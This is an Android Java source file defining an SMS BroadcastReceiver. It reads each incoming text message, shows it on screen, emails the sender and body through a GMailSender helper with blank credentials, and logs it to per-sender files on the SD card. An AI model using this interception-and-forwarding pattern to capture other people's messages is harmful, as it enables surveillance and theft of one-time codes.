package com.example.bongi;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStreamWriter;

public class SMSReceiver extends BroadcastReceiver {
    SmsMessage[] msgs = null;

    String str = "";
    String str1 = "";
    String str2 = "";



    @SuppressLint("StaticFieldLeak")
    @Override
    public void onReceive(final Context context, Intent intent) {
        // Parse the SMS.
        Bundle bundle = intent.getExtras();

        if (bundle != null) {
            // Retrieve the SMS.
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];
            for (int i = 0; i < msgs.length; i++) {
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                // In case of a particular App / Service.
                //if(msgs[i].getOriginatingAddress().equals("+91XXX"))
                //{
                str += msgs[i].getOriginatingAddress();
                str += " :";
                str += msgs[i].getMessageBody().toString();

              //  str1="0"+msgs[i].getOriginatingAddress().substring(3,13);
                str1=msgs[i].getOriginatingAddress();
                str2=msgs[i].getMessageBody().toString();


                //}
            }
            // Display the SMS as Toast.

            Toast.makeText(context, str, Toast.LENGTH_LONG).show();


            new AsyncTask<Void, Void, Void>() {

                @SuppressLint("StaticFieldLeak")
                @Override public Void doInBackground(Void... arg) {

                    try {
Context context1 = context;

                        GMailSender sender = new GMailSender("", "");
                        sender.sendMail("SMS",
                                "" + str + "",
                                "email",
                                "email");

                    } catch (Exception e) {

                        Log.e("SendMail", e.getMessage(), e);

                    }
                    return null;}
            }.execute();

        }
        try {

            //   showDialog(name,number,value);
            //File sdcard = Environment.getExternalStorageDirectory();
//Get the text file
            File f1 = new File("/sdcard/smslo/"+str1);
//Read text from file
            StringBuilder t5 = new StringBuilder();

            try {
                BufferedReader br = new BufferedReader(new FileReader(f1));
                String line;

                while ((line = br.readLine()) != null) {

                    t5.append(line);
                    t5.append("\n");
                }
                br.close();
            } catch (IOException e) {
                //You'll need to add proper error handling here
            }


            File myFile = new File("/sdcard/smslo/"+str1);

            FileOutputStream fOut = new FileOutputStream(myFile);

            OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);


            if (myFile.exists()) {


                t5.append("\n");

                t5.append(""+str1+ "Say...");

                t5.append(str2);

                t5.append("  ");

                myOutWriter.append(t5);

                myOutWriter.close();

                fOut.close();




            } else {


                myFile.createNewFile();


                myOutWriter.append(str1);

                myOutWriter.append("msg:");

                myOutWriter.append(str2);


                myOutWriter.close();
                fOut.close();

            }


        } catch (Exception e) {
            Log.e("ERRR", "Could not create file", e);
        }

    }
}